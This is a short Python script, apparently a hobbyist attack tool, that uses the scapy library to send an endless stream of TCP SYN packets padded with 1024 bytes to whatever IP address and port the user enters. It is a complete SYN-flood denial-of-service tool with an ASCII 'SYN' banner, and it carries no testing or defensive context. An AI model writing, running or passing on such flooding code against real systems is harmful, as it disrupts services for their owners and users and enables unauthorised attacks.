from scapy.all import *
print("""
 .oooooo..o oooooo   oooo ooooo      ooo 
d8P'    `Y8  `888.   .8'  `888b.     `8' 
Y88bo.        `888. .8'    8 `88b.    8  
 `"Y8888o.     `888.8'     8   `88b.  8  
     `"Y88b     `888'      8     `88b.8  
oo     .d8P      888       8       `888  
8""88888P'      o888o     o8o        `8  

""")
target_ip = input("What is the target IP: ")
target_port = input("Please enter the target port port: ")
ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)
p = ip / tcp / raw
send(p, loop=1, verbose=0)
